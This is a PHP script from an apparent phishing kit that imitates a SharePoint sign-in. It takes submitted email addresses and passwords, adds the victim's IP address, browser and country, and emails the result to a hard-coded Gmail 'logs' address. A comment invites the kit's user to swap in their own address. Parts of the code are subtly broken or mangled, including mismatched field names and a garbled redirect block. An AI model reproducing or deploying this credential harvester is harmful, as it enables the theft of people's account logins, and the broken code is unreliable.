<?php

 echo $_POST['email'] . ' ' . $_POST['password']; 
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}


if (isset($_POST['email']) && isset($_POST['password'])) {
  $email = $_POST['emaiI'];
  $password = $_POST['passw0rd'];
  
  if (!empty($email) && !empty($password)) {

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$epass = $_POST['epass'];
$passchk = strlen($epass);
$message .= "--------+ SharePoint +--------\n";
$message .= "Email ID : ".$email."\n";
$message .= "Email Password : ".$password."\n";

$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY pwebglobal.us in 2023 +---\n";

$send = "xianqzhou.han@gmail.com"; // <===== Put your receiving logs email here . 

$subject = "SharePoint result details | $country | $email";
$headers = "From: Webmarketer <no-reply@webmarketer.com>\n";
     
mail($send,$subject,$message,$headers);


//header("Location: <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
header("Location: javascript://reload()");

  }
}

?>